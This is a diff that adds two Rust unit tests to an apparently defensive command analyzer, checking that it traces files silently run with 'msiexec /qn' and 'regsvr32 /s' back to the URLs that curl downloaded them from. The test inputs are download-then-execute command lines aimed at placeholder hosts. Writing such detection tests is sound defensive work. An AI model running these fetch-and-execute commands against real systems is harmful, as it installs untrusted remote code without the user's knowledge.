@@ -11564,6 +11564,29 @@ msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
     }
 
     #[test]
+    fn msiexec_slash_equivalent_package_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\setup.msi https://msiexec-slash-equivalent.example/setup.msi"#,
+            &mut env,
+        );
+        interpret_line("msiexec /i C:/Temp/setup.msi /qn", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i C:/Temp/setup.msi /qn"
+                        && url == "https://msiexec-slash-equivalent.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec slash-equivalent package did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_current_dir_package_resolves_tracked_download_source() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -12128,6 +12151,29 @@ regsvr32 /s stage.dll"#,
         assert!(
             has,
             "regsvr32 basename load target did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_slash_equivalent_load_target_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://regsvr32-slash-equivalent.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("regsvr32 /s C:/Temp/stage.dll", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s C:/Temp/stage.dll"
+                        && url == "https://regsvr32-slash-equivalent.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 slash-equivalent load target did not resolve full-path download source: {:?}",
             env.traits
         );
     }
